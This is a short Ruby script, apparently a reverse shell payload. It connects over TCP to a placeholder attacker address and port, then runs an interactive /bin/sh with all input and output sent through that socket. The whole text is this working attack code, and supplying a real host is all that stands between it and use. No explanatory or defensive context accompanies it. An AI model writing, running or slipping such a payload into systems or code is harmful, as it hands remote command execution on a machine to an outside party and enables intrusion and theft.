require 'socket'

sock = TCPSocket.new("attacker_ip", attacker_port)
exec "/bin/sh -i", in: sock, out: sock, err: sock
